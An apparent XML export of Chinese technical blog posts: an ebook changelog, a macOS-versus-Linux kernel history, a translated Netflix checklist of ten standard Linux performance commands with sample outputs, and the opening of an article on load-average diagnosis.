24,944 —– 20171230 187 4,821 7,708 29,052 GitBook Edition 0.3 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 Edition 0.4 20180714 Edition 0.3 20171225 Edition 0.2 20170701 Edition 0.1 20170210 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.4 20180714 mod “网络工程篇”调整为分布式系统专题 mod Pcap、sFlow 调整到Cyber-Security专题 add 应用监控与可视化;LinkedIn Kafka Monitor add 应用监控与可视化;2018 Docker 用户报告 add PostgreSQL 数据库 add 案例：基于 Kafka 的事件溯源型微服务 add 分布式追踪系统体系概要 add 开源分布式跟踪系统 OpenCensus add 从作坊到工厂的寓言故事 add 基础设施标准化：部署和配置管理 add macOS vs Linux Kernels ？ add IT 工程师养生指南 Edition 0.3 20171225 修订 Linux 快速性能诊断三篇、gRPC 监控数据可视化：Graphite、GIS How Linux Works:内存管理 调整部分章节顺序 Edition 0.2 20170701 Linux 入门命令100条 How Linux Works: Kernel Space &amp; User Space Init 动态追踪技术：strace,gdb,ftrace,bcc,BPF 基于数据分析的网络态势感知 Cyber-Security:IPv6,Web Headers,香港CSTCB Edition 0.1 20170210 第一个 GitBook 版本，主要为 2016 年内容合辑 基于Linux单机负载评估 新一代Ntopng网络流量监控—可视化和架构分析 基于LVS的AAA负载均衡架构实践 Linus Torvalds: The mind behind Linux 读者反馈信息]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谁是王者：macOS vs Linux Kernels ？]]></title>
    <url>%2F2017%2F12%2F19%2FLinux-Win-Mac%2F</url>
    <content type="text"><![CDATA[谁是王者：macOS vs Linux Kernels ？ Mac 快键键 谁是王者：macOS vs Linux Kernels ？有些人可能认为 macOS 和 Linux 内核是类似的系统, 因为它们看起来可以处理类似的命令和软件。有些人甚至认为苹果的 macOS 是基于 Linux 的。事实上, 这两个内核各有特色，也都有不同寻常的历史。 macOS Kernel 简史我们首先从 macOS Kernel 的历史开始讲起。1985年, 史蒂夫·乔布斯（ Steve Jobs）离开苹果公司（Apple ）并创办了一家新的计算机公司：NeXT 。乔布斯快速向市场推出了一款新型电脑 (搭载新操作系统) 。为了节省时间, NeXT 团队使用了 Mach kernel（ 来自卡内基·梅隆大学，是最早实现微核心操作系统的例子之一，是许多其它相似的项目的标准，在分布式与并行运算领域应用广泛) 和 部分 BSD 代码库, 创建了 NeXTSTEP 操作系统。具有讽刺意味的是，早期 Mach 只是服务于操作系统研究，曾经的开发目标甚至是取代 BSD ，目前 Mach 的研究至今似乎是停止了，但是许多商业化操作系统，特别是 Mac OS X 及其它派生系统却活得很滋润。 在商业上，NeXT 公司从来没有获得成功, 部分原因是乔布斯的花钱习惯仍然像他在苹果公司一样大手大脚。与此同时, 苹果公司多次尝试更新自己的操作系统, 但是包括与 IBM 合作在内、一直未取得成功。1997年, 苹果公司以 4 亿 2900 万美元收购了 NeXT 公司 。作为交易的一部分, 史蒂夫·乔布斯重新回到苹果, NeXTSTEP 操作系统也成为了 macOS 和 iOS 操作系统的基础。值得注意的是，NeXT 团队的另一项成果 WebObjects 后来集成到了 Mac OS X Server 和 Xcode 中。 Linux Kernel 简史与 macOS Kernel 不同, Linux 从一开始不是作为商业计划的一部分而创建的。相反, Linux 在 1991 年由芬兰计算机专业的学生林纳斯·托瓦兹（Linus Torvalds）创建。最初 Linux 内核代码是按照林纳斯个人的计算机规格编写, 因为他想利用自己电脑上搭载的新式 80386 处理器。林纳斯在 1991 年 8 月将他编写的操作系统内核代码发布到网络上。不久, 他收到了来自世界各地爱好者贡献的代码和建议。第二年, Orest Zborowski 将 X Windows 系统移植到 Linux 中, 使其能够支持图形用户界面。 在过去的 27 年里, Linux 已经慢慢成长壮大，它不再是一个学生的业余项目。目前，Linux 运行在世界上大多数的计算设备和超级计算机上。 他在旧版的SketchPad代码基础上进行了修改，让它运行在Macintosh上，并改名MacSketch。SketchPad通过菜单的方式选取图案和样式，Bill把它们放到屏幕下方，变成固定的调色板，并在屏幕左边另外增加一组调色板，包含了各种各样的绘图工具。后续还会不断增加新的工具，不过MacPaint早期的基本架构已经就此成形。—— 《硅谷革命：成就苹果公司的疯狂往事》 macOS Kernel 特色macOS kernel 的特色官方总结为: XNU。意思是 “XNU 不是 Unix”。根据苹果的 Github 页面, XNU 是 “一个混合内核, 奠基于卡耐基·梅隆大学开发的 Mach kernel , 它的组件来自 FreeBSD 和用于编写驱动程序的 C++ API “。BSD 子系统部分的代码 “通常作为微核心系统中实现用户空间服务”。Mach 部分的代码则负责较底层的工作, 例如多任务（multitasking）、内存保护（ protected memory）、虚拟内存管理（virtual memory management）、支持内核调试（kernel debugging）和控制台 I/O 。 Mach 的虚拟内存（VM）系统也被 BSD 的开发者用于 CSRG ，并出现在 BSD 派生的系统中，如 FreeBSD ，但是无论 macOS 还是 FreeBSD 都并未保留 Mach 首倡的微核心结构，除了 macOS 继续提供微核心于内部处理通信以及应用程序直接控制之外。 他在旧版的SketchPad代码基础上进行了修改，让它运行在Macintosh上，并改名MacSketch。SketchPad通过菜单的方式选取图案和样式，Bill把它们放到屏幕下方，变成固定的调色板，并在屏幕左边另外增加一组调色板，包含了各种各样的绘图工具。后续还会不断增加新的工具，不过MacPaint早期的基本架构已经就此成形。———《硅谷革命：成就苹果公司的疯狂往事》 Linux Kernel 特色如果说 macOS 内核的特点是结合了微核心 (microkernel ，Mach) 和宏内核 (monolithic kernel ，BSD)，那么 Linux 则仅仅是一个宏内核。宏内核负责管理 CPU、内存、进程间通信、设备驱动程序、文件系统和系统服务调用。 一句话总结macOS 内核代码 (XNU) 基于两个甚至包含古老代码基的组合。另一方面, Linux 的历史更短, 它从头开始编写并且应用广泛。 预测未来的最佳方式就是创造未来。—— 个人电脑之父 艾伦·凯(Alan Kay) 1234567891011121314151617181920212223242526272829303132333435# yum info google-chrome-stablegoogle-chrome | 1.3 kB 00:00 google-chrome/primary | 1.7 kB 00:00 google-chrome 3/3可安装的软件包Name : google-chrome-stableArch : x86_64Version : 71.0.3578.98Release : 1Size : 54 MRepo : google-chromeSummary : Google ChromeURL : https://chrome.google.com/License : Multiple, see https://chrome.google.com/Description : The web browser from Google : : Google Chrome is a browser that combines a minimal design with sophisticated technology to make the web faster, safer, and easier.# yum install google-chrome-stable设置安装进程解决依赖关系--&gt; 执行事务检查---&gt; Package google-chrome-stable.x86_64 0:71.0.3578.98-1 will be 安装--&gt; 处理依赖关系 libnss3.so(NSS_3.22)(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libc.so.6(GLIBC_2.16)(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 liberation-fonts，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libssl3.so(NSS_3.28)(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libgtk-3.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libappindicator3.so.1()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libatspi.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libgdk-3.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 处理依赖关系 libatk-bridge-2.0.so.0()(64bit)，它被软件包 google-chrome-stable-71.0.3578.98-1.x86_64 需要--&gt; 完成依赖关系计算 You could try using --skip-broken to work around the problem You could try running: rpm -Va --nofiles --nodigest 扩展阅读电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details How Linux Works Linux 性能诊断:负载评估 Linux 性能诊断:快速检查单 操作系统原理 | How Linux Works（一）：启动 操作系统原理 | How Linux Works（二）：空间管理 操作系统原理 | How Linux Works（三）：内存管理 操作系统原理 | How Linux Works（四）：网络管理 动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Difference Between the macOS and Linux Kernels What is Mac OS X? Linkedin:Orest Zborowski Linux Networking/A brief history of Linux Networking Kernel Development]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:快速检查单(Netflix版)]]></title>
    <url>%2F2017%2F12%2F11%2FLinux-Perf-Netflix%2F</url>
    <content type="text"><![CDATA[摘要 快速检查单QRH 请大家记住这样一个思路：先把大石头移开。大石头移开后，中等大小的石头可能就显现出来了。性能调优的原则就是先解决大问题，然后解决剩余问题中的大问题。在解决了大问题后，通常隐藏在它背后的问题也会暴露出来。也就是说，解决了前面的瓶颈后，下一个瓶颈就显现出来了。—— 《图解性能优化》 快速检查单快速检查单（Quick Reference Handbook，QRH）是飞行员在飞行过程中依赖的重要指导性文件。 第一张飞行检查单起源于一次严重的航空事故。1935年波音公司研制的一架新型轰炸机在试飞过程中突然坠机，导致2名机组人员遇难——包括一名最优秀的试飞员普洛耶尔·希尔少校。后来的调查结果分析，事故并不是机械故障引起的，而是人为失误造成。新型飞机比以往的飞机更复杂，飞行员要管理4台发动机，操控起落架、襟翼、电动配平调整片和恒速液压变距螺旋桨等。因为忙于各种操作，希尔少校忘记了一项简单却很重要的工作 —— 在起飞前忘记对新设计的升降舵和方向舵实施解锁。 美国军方组织飞行专家编制了一份飞行检查单，将起飞、巡航、着陆和滑行各阶段的重要步骤写在一张索引卡片上。飞行员根据检查单的提示检查刹车是否松开，飞行仪表是否准确设定，机舱门窗是否完全关闭，升降舵等控制面是否已经解锁。 Netflix 性能工程团队登陆一台 Linux 服务器排查性能问题：开始一分钟你该检查哪些呢？在 Netflix 我们有一个庞大的 EC2 Linux集群，也有许多性能分析工具用于监视和检查它们的性能。它们包括用于云监测的Atlas (工具代号) ，用于实例分析的 Vector (工具代号) 。尽管这些工具能帮助我们解决大部分问题，我们有时也需要登陆一台实例、运行一些标准的 Linux 性能分析工具。在这篇文章，Netflix 性能工程团队将向您展示：在开始的60秒钟，利用标准的Linux命令行工具，执行一次充分的性能检查。 Linux 性能分析黄金60秒运行以下10个命令，你可以在60秒内，获得系统资源利用率和进程运行情况的整体概念。查看是否存在异常、评估饱和度，它们都非常易于理解，可用性强。饱和度表示资源还有多少负荷可以让它处理，并且能够展示请求队列的长度或等待的时间。 123456uptimedmesg | tail vmstat 1mpstat -P ALL 1 pidstat 1iostat -xz 1 free -msar -n DEV 1sar -n TCP,ETCP 1 top 这些命令需要安装sysstat包。这些命令输出的指标，将帮助你掌握一些有效的方法：一整套寻找性能瓶颈的方法论。这些命令需要检查所有资源的利用率、饱和度和错误信息（CPU、内存、磁盘等）。同时，当你检查或排除一些资源的时候，需要注意在检查过程中，根据指标数据指引，逐步缩小目标范围。 接下来的章节，将结合生产环境的案例演示这些命令。如果希望了解这些工具的详细信息，可以查阅它们的操作文档。 1. uptime12$ uptime23:51:26up21:31, 1user, loadaverage:30.02,26.43,19.02 这是一个快速查看平均负载的方法，表示等待运行的任务（进程）数量。在Linux系统中，这些数字包含等待CPU运行的进程数，也包括不间断I/O阻塞的进程数（通常是磁盘I/O）。它展示了一个资源负载（或需求）的整体概念，但是无法理解其中的内涵，在没有其它工具的情况下。仅仅是一种快速查看手段而已。 这三个数字呈现出平均负载在几何级减弱，依次表示持续1分钟，5分钟和15分钟内。这三个数字能告诉我们负载在时间线上是如何变化的。举例说明，如果你在一个问题服务器上执行检查，1分钟的值远远低于15分钟的值，可以判断出你也许登录得太晚了，已经错过了问题。 在上面的例子中，平均负载的数值显示最近正在上升，1分钟值高达30，对比15分钟值则是19。这些指标值像现在这么大意味着很多情况：也许是CPU繁忙；vmstat 或者 mpstat 将可以确认，本系列的第三和第四条命令。 2. dmesg | tail12345678$ dmesg | tail[1880957.563150] perl invoked oom-killer: gfp_mask=0x280da, order=0, oom_score_adj=0[...][1880957.563400] Out of memory: Kill process 18694 (perl) score 246 or sacrifice child[1880957.563408] Killed process 18694 (perl) total-vm:1972392kB, anon-rss:1953348kB, file-rss:0kB[2320864.954447] TCP: Possible SYN flooding on port 7001. Dropping request. Check SNMP counters. 这个结果输出了最近10条系统信息。可以查看到引起性能问题的错误。上面的例子包含了oom-killer,以及TCP丢包。 译者注:除了error级的日志，info级的也要留个心眼，可能包含一些隐藏信息。 3. vmstat 112345678$ vmstat 1procs ---------memory---------- ---swap-- -----io---- -system-- ------cpu-----r b swpd free buff cache si so bi bo in cs us sy id wa st34 0 0 200889792 73708 591828 0 0 0 5 6 10 96 1 3 0 032 0 0 200889920 73708 591860 0 0 0 592 13284 4282 98 1 1 0 032 0 0 200890112 73708 591860 0 0 0 0 9501 2154 99 1 0 0 032 0 0 200889568 73712 591856 0 0 0 48 11900 2459 99 0 0 0 032 0 0 200890208 73712 591860 0 0 0 0 15898 4840 98 1 1 0 0 vmstat 是一个获得虚拟内存状态概况的通用工具（最早创建于10年前的BSD）。它每一行记录了关键的服务器统计信息。vmstat 运行的时候有一个参数1，用于输出一秒钟的概要数据。第一行输出显示启动之后的平均值，用以替代之前的一秒钟数据。现在，跳过第一行，让我们来学习并且记住每一列代表的意义。 r：正在CPU上运行或等待运行的进程数。相对于平均负载来说，这提供了一个更好的、用于查明CPU饱和度的指标，它不包括I/O负载。注: “r”值大于CPU数即是饱和。 free: 空闲内存（kb)如果这个数值很大，表明你还有足够的内存空闲。包括命令7“free m”，很好地展现了空闲内存的状态。 si, so: swap入／出。如果这个值非0，证明内存溢出了。 us, sy, id, wa, st:它们是CPU分类时间，针对所有CPU的平均访问。分别是用户时间，系统时间（内核），空闲，I/O等待时间，以及被偷走的时间（其它访客，或者是Xen）。CPU分类时间将可以帮助确认，CPU是否繁忙，通过累计用户系统时间。等待I/O的情形肯定指向的是磁盘瓶颈；这个时候CPU通常是空闲的，因为任务被阻塞以等待分配磁盘I/O。你可以将等待I/O当作另一种CPU空闲，一种它们为什么空闲的解释线索。 系统时间对I/O处理非常必要。一个很高的平均系统时间，超过20%，值得深入分析：也许是内核处理I/O非常低效。在上面的例子中，CPU时间几乎完全是用户级的，与应用程序级的利用率正好相反。所有CPU的平均利用率也超过90%。这不一定是一个问题；还需检查“r”列的饱和度。 4. mpstat P ALL 1123456789$ mpstat -P ALL 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:38:49 PM CPU %usr %nice %sys %iowait %irq %soft %steal %guest %gnice %idle07:38:50 PM all 98.47 0.00 0.75 0.00 0.00 0.00 0.00 0.00 0.00 0.7807:38:50 PM 0 96.04 0.00 2.97 0.00 0.00 0.00 0.00 0.00 0.00 0.9907:38:50 PM 1 97.00 0.00 1.00 0.00 0.00 0.00 0.00 0.00 0.00 2.0007:38:50 PM 2 98.00 0.00 1.00 0.00 0.00 0.00 0.00 0.00 0.00 1.0007:38:50 PM 3 96.97 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 3.03[...] 这个命令可以按时间线打印每个CPU的消耗，常常用于检查不均衡的问题。如果只有一个繁忙的CPU，可以判断是属于单进程的应用程序。 5. pidstat 112345678910111213141516$ pidstat 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)07:41:02 PM UID PID %usr %system %guest %CPU CPU Command07:41:03 PM 0 9 0.00 0.94 0.00 0.94 1 rcuos/007:41:03 PM 0 4214 5.66 5.66 0.00 11.32 15 mesos-slave07:41:03 PM 0 4354 0.94 0.94 0.00 1.89 8 java07:41:03 PM 0 6521 1596.23 1.89 0.00 1598.11 27 java07:41:03 PM 0 6564 1571.70 7.55 0.00 1579.25 28 java07:41:03 PM 60004 60154 0.94 4.72 0.00 5.66 9 pidstat07:41:03 PM UID PID %usr %system %guest %CPU CPU Command07:41:04 PM 0 4214 6.00 2.00 0.00 8.00 15 mesos-slave07:41:04 PM 0 6521 1590.00 1.00 0.00 1591.00 27 java07:41:04 PM 0 6564 1573.00 10.00 0.00 1583.00 28 java07:41:04 PM 108 6718 1.00 0.00 0.00 1.00 0 snmp-pass07:41:04 PM 60004 60154 1.00 4.00 0.00 5.00 9 pidstat^C pidstat 有一点像顶级视图－针对每一个进程，但是输出的时候滚屏，而不是清屏。它非常有用，特别是跨时间段查看的模式，也能将你所看到的信息记录下来，以利于进一步的研究。上面的例子识别出两个 java 进程引起的CPU耗尽。“％CPU” 是对所有CPU的消耗；1591% 显示 java 进程占用了几乎16个CPU。 6. iostat xz 1123456789101112$ iostat -xz 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)avg-cpu: %user %nice %system %iowait %steal %idle73.96 0.00 3.73 0.03 0.06 22.21Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %utilxvda 0.00 0.23 0.21 0.18 4.52 2.08 34.37 0.00 9.98 13.80 5.42 2.44 0.09xvdb 0.01 0.00 1.02 8.94 127.97 598.53 145.79 0.00 0.43 1.78 0.28 0.25 0.25xvdc 0.01 0.00 1.02 8.86 127.79 595.94 146.50 0.00 0.45 1.82 0.30 0.27 0.26dm-0 0.00 0.00 0.69 2.32 10.47 31.69 28.01 0.01 3.23 0.71 3.98 0.13 0.04dm-1 0.00 0.00 0.00 0.94 0.01 3.78 8.00 0.33 345.84 0.04 346.81 0.01 0.00dm-2 0.00 0.00 0.09 0.07 1.35 0.36 22.50 0.00 2.55 0.23 5.62 1.78 0.03[...] 这是一个理解块设备（磁盘）极好的工具，不论是负载评估还是作为性能测试成绩。 r/s, w/s, rkB/s, wkB/s: 这些是该设备每秒读％、写％、读Kb、写Kb。可用于描述工作负荷。一个性能问题可能只是简单地由于一个过量的负载引起。 await: I/O平均时间（毫秒）这是应用程序需要的时间，它包括排队以及运行的时间。远远大于预期的平均时间可以作为设备饱和，或者设备问题的指标。 avgqu­sz: 向设备发出的平均请求数。值大于1可视为饱和（尽管设备能对请求持续运行，特别是前端的虚拟设备－后端有多个磁盘）。 %util: 设备利用率这是一个实时的繁忙的百分比，显示设备每秒钟正在进行的工作。值大于60%属于典型的性能不足（可以从await处查看），尽管它取决于设备。值接近100% 通常指示饱和。￼￼如果存储设备是一个前端逻辑磁盘、后挂一堆磁盘，那么100%的利用率也许意味着，一些已经处理的I/O此时占用100%，然而，后端的磁盘也许远远没有达到饱和，其实可以承担更多的工作。 切记：磁盘I/O性能低并不一定是应用程序问题。许多技术一贯使用异步I/O，所以应用程序并不会阻塞，以及遭受直接的延迟（例如提前加载，缓冲写入）。 7. free m12345$ free -mtotal used free shared buffers cachedMem: 245998 24545 221453 83 59 541-/+ buffers/cache: 23944 222053Swap: 0 0 0 buffers: buffer cache,用于块设备I/O。cached:page cache, 用于文件系统。￼ ￼我们只是想检查这些指标值不为0——那样意味着磁盘I/O高、性能差（确认需要用iostat）。上面的例子看起来不错，每一类内存都有富余。 “­/+ buffers/cache”: 提供了关于内存利用率更加准确的数值。 Linux可以将空闲内存用于缓存，并且在应用程序需要的时候收回。所以应用到缓存的内存必须以另一种方式包括在内存空闲的数据里面。有一个网站linux ate my ram,专门探讨这个困惑。它还有更令人困惑的地方，如果在Linux上使用ZFS,正如我们运行一些服务，ZFS拥有自己的文件系统缓存，也不能在free -m 的输出里正确反映。这种情况会显示系统空闲内存不足，但是内存实际上可用，通过回收 ZFS 的缓存。 关于 Linux 内存管理的更多内容，可以阅读操作系统原理：How Linux Works (Memroy)。 8. sar n DEV 11234567891011$ sar -n DEV 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)12:16:48 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil12:16:49 AM eth0 18763.00 5032.00 20686.42 478.30 0.00 0.00 0.00 0.0012:16:49 AM lo 14.00 14.00 1.36 1.36 0.00 0.00 0.00 0.0012:16:49 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.0012:16:49 AM IFACE rxpck/s txpck/s rxkB/s txkB/s rxcmp/s txcmp/s rxmcst/s %ifutil12:16:50 AM eth0 19763.00 5101.00 21999.10 482.56 0.00 0.00 0.00 0.0012:16:50 AM lo 20.00 20.00 3.25 3.25 0.00 0.00 0.00 0.0012:16:50 AM docker0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00^C 使用这个工具用来检查网络接口吞吐量：rxkB/s 和 txkB/s, 作为负载的一种度量方式, 也可以用来检查是否已经达到某种瓶颈。 在上面的例子中，网卡 eth0 收包大道 22 Mbytes/s, 即176 Mbits/sec (就是说，在 1 Gbit/sec 的限制之内)。此版本也有一个体现设备利用率的 “％ifutil” （两个方向最大值），我们也可以使用 Brendan的nicstat 工具来度量。和 nicstat 类似，这个值很难准确获取，看起来在这个例子中并没有起作用（0.00）。 9. sar n TCP,ETCP 11234567891011$ sar -n TCP,ETCP 1Linux 3.13.0-49-generic (titanclusters-xxxxx) 07/14/2015 _x86_64_ (32 CPU)12:17:19 AM active/s passive/s iseg/s oseg/s12:17:20 AM 1.00 0.00 10233.00 18846.0012:17:19 AM atmptf/s estres/s retrans/s isegerr/s orsts/s12:17:20 AM 0.00 0.00 0.00 0.00 0.0012:17:20 AM active/s passive/s iseg/s oseg/s12:17:21 AM 1.00 0.00 8359.00 6039.0012:17:20 AM atmptf/s estres/s retrans/s isegerr/s orsts/s12:17:21 AM 0.00 0.00 0.00 0.00 0.00^C 这是一个关键TCP指标的概览视图。包括： active/s: 本地初始化的 TCP 连接数 ／每秒（例如，通过connect() ） passive/s: 远程初始化的 TCP 连接数／每秒（例如，通过accept() ） retrans/s: TCP重发数／每秒 这些活跃和被动的计数器常常作为一种粗略的服务负载度量方式：新收到的连接数 (被动的),以及下行流量的连接数 (活跃的)。这也许能帮助我们理解，活跃的都是外向的，被动的都是内向的，但是严格来说这种说法是不准确的（例如，考虑到“本地－本地”的连接）。重发数是网络或服务器问题的一个标志；它也许是因为不可靠的网络（如，公共互联网），也许是由于一台服务器已经超负荷、发生丢包。上面的例子显示每秒钟仅有一个新的TCP连接。 10. top123456789101112131415161718$ toptop - 00:15:40 up 21:56, 1 user, load average: 31.09, 29.87, 29.92Tasks: 871 total, 1 running, 868 sleeping, 0 stopped, 2 zombie%Cpu(s): 96.8 us, 0.4 sy, 0.0 ni, 2.7 id, 0.1 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem: 25190241+total, 24921688 used, 22698073+free, 60448 buffersKiB Swap: 0 total, 0 used, 0 free. 554208 cached MemPID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND20248 root 20 0 0.227t 0.012t 18748 S 3090 5.2 29812:58 java4213 root 20 0 2722544 64640 44232 S 23.5 0.0 233:35.37 mesos-slave66128 titancl+ 20 0 24344 2332 1172 R 1.0 0.0 0:00.07 top5235 root 20 0 38.227g 547004 49996 S 0.7 0.2 2:02.74 java4299 root 20 0 20.015g 2.682g 16836 S 0.3 1.1 33:14.42 java1 root 20 0 33620 2920 1496 S 0.0 0.0 0:03.82 init2 root 20 0 0 0 0 S 0.0 0.0 0:00.02 kthreadd3 root 20 0 0 0 0 S 0.0 0.0 0:05.35 ksoftirqd/05 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H6 root 20 0 0 0 0 S 0.0 0.0 0:06.94 kworker/u256:08 root 20 0 0 0 0 S 0.0 0.0 2:38.05 rcu_sched top命令包含了许多我们之前已经检查的指标。它可以非常方便地运行，看看是否任何东西看起来与从前面的命令的结果完全不同，可以表明负载指标是不断变化的。顶部下面的输出，很难按照时间推移的模式查看，可能使用如 vmstat 和 pidstat 等工具会更清晰，它们提供滚动输出。如果你保持输出的动作不够快 （CtrlS 要暂停，CtrlQ 继续），屏幕将清除，间歇性问题的证据也会丢失。 总结故障检查过程中，人的作用主要是作出决策。遗忘、遗漏、麻痹、松懈是每个人都会犯的错误，好的公司都会根据经验编制检查单，提高工作效率，降低人为失误发生的概率。出于竞争因素考虑，应该充分重视检查单的更新、完善、自动化，以此为基础建立自己的技术壁垒。 电子书《Linux Perf Master》 https://riboseyim.gitbook.io/perf https://www.gitbook.com/book/riboseyim/linux-perf-master/details 扩展阅读：性能诊断指南 Linux 性能诊断：负载评估 Linux 性能诊断：快速检查单 Linux 性能诊断：JVM 扩展阅读：How Linux Works How Linux Works：The Big Picture How Linux Works：BASIC Commands How Linux Works：BASIC Commands Extension How Linux Works：Device and FileSystem How Linux Works：Boots How Linux Works：用户空间 How Linux Works：内存管理 How Linux Works：网络管理 PreviewHow Linux Works：路由管理 扩展阅读：动态追踪技术 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Netflix Technology Blog:Linux Performance Analysis in 60,000 Milliseconds 从《清单革命》看飞行检查单]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 性能诊断:负载评估]]></title>
    <url>%2F2017%2F12%2F11%2FLinux-Perf-Load%2F</url>
    <content type="text"><![CDATA[摘要 基于 Linux 单机的负载评估 负载诊断流程 概念：什么是负载 负载：CPU 还是 I/O Linux 内核进程调度器 概要：负载诊断流程 观察load average (平均负载) 观察CPU、I/O是否存在瓶颈 从load avgerage等总括性的数据着手，参考CPU使用率和I/O等待时间等具体的数字，从而自顶向下快速排查各进程状态。 概念：什么是负载?负载可以分为两大部分：CPU负载、I/O 负载 。 load average123uptimetopcat /proc/loadavg 1234567load average:0.65, 1.49, 1.76 （负载很低）load average:3.49, 3.67, 3.75 （负载一般）load average:33.20, 18.39, 15.21 (负载高)load average:70.25, 80.50, 95.38 (负载非常高，需要干预)load average:7.89, 11.42, 13.42 (当前负载趋于下降)load average:17.89, 13.28, 4.45 (当前负载趋于上升) 依次时过去1分钟，5分钟，15分钟内，单位时间的等待任务数，也就是表示平均有多少任务正处于等待状态。在load average较高的情况下，就说明等待运行的任务较多，因此轮到该任务运行的等待时间就会出现较大延迟，即反映了此时负载较高。 Linux 内核进程调度器（Process Scheduler）负责决定任务运行的优先级，以及让任务等待或使之重新开始等核心工作。调度器划分并管理进程（Process）的状态。例如： 等待分配CPU资源的状态 等待磁盘输入输出完毕的状态 进程描述符的状态 进程状态 PS Stat 说明 TASK_RUNNING R(Run) 运行状态。只要CPU空闲，随时都可以开始。 TASK_INTERRUPTIBLE S(Sleep) 可中断的等待状态。例如系统睡眠或来自于用户输入的等待等。 TASK_UNINTERRUPTIBLE D(Disk Sleep) 不可中断的等待状态。主要为短时间恢复时的等待状态。例如磁盘输入输出的等待 TASK_STOPPED 响应暂停信号而运行中断的状态。直到恢复（Resume）前都不会被调度 TASK_ZOMBIE Z(Zombie) 僵死状态。虽然子进程已经终止（exit）,但父进程尚未执行wait(),因此该进程的资源没有被系统释放 TASK_RUNNING 正在运行 TASK_RUNNING （等待状态，加权换算） TASK_INTERRUPTIBLE（等待状态，加权换算） TASK_UNINTERRUPTIBLE（等待状态，不加权换算） load average 表示“等待进程的平均数”，除了“TASK_RUNNING正在运行”，其它三个都是等待状态。TASK_INTERRUPTIBLE不被换算。即只换算“虽然需要即刻运行处理，但是无论如何都必须等待”。 load average所描述的负载就是：需要运行处理，但又必需等待队列前的进程处理完成的进程个数。具体来说：要么等待授予CPU运行权限，要么等待磁盘I/O完成。 内核函数：kernei/timer.c的calc-load(); 调用周期：每次计时器中断（centos为4ms） CPU 还是 I/O ?load average的数字只是表示等待的任务数，仅根据load average并不能判断具体是CPU负载高还是I/O负载高。 CPU密集型程序 I/O密集型程序 Sar (System Activity Reporter)CPU使用率和I/O等待时间都是在不断变化的，可以通过sar 命令来确认这些指标。sar 工具包含在 sysstat 软件包内。 123456789101112$ sarLinux 04/17/16 _x86\_64_ (24 CPU)00:00:01 CPU %user %nice %system %iowait %steal %idle00:10:02 all 1.26 0.00 0.55 0.00 0.00 98.1900:20:01 all 1.58 0.00 1.04 0.00 0.00 97.3800:30:01 all 1.23 0.00 0.56 0.00 0.00 98.2100:40:01 all 1.59 0.00 1.01 0.00 0.00 97.4000:50:01 all 1.35 0.00 0.59 0.00 0.00 98.0601:00:01 all 1.63 0.00 1.10 0.00 0.00 97.2701:10:01 all 1.22 0.00 0.54 0.00 0.00 98.2401:20:01 all 1.68 0.00 1.06 0.00 0.00 97.2501:30:01 all 1.23 0.00 0.54 0.00 0.00 98.23 123456789101112$ sar 1 1018:54:58 %usr %sys %wio %idle18:54:59 18 3 0 7918:55:00 46 14 0 4018:55:01 38 13 0 4918:55:02 17 4 0 7918:55:03 11 4 0 8518:55:04 12 5 0 8318:55:05 20 4 0 7618:55:06 22 3 0 7518:55:07 21 4 0 7518:55:08 17 4 0 79 输出参数: %user:用户(一般的应用软件运作模式)CPU资源 